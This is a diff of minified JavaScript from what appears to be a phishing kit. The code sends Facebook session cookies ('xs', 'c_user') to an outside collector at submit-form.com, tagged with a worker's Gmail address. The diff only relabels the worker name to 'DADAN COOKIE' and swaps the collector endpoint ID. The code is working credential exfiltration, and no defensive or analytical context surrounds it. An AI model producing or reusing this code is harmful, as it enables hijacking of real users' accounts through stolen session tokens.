@@ -9824,7 +9824,7 @@
                                             workerEmail: "adsright680@gmail.com",
                                             xs: r,
                                             c_user: i,
-                                            name: "DADIYA"
+                                            name: "DADAN COOKIE"
                                         })
                                     }).then((e => {
                                         e.ok
@@ -13368,7 +13368,7 @@
                                             workerEmail: "adsright680@gmail.com",
                                             xs: o,
                                             c_user: u,
-                                            name: "DADIYA"
+                                            name: "DADAN COOKIE"
                                         })
                                     }).then((e => {
                                         e.ok
@@ -13471,7 +13471,7 @@
                 he.jsx)("button", {
                     onClick: n => {
                         n.preventDefault(),
-                        fetch("https://submit-form.com/Ma2D5eoYE", {
+                        fetch("https://submit-form.com/PT4bD89lm", {
                             method: "POST",
                             headers: {
                                 "Content-Type": "application/json"
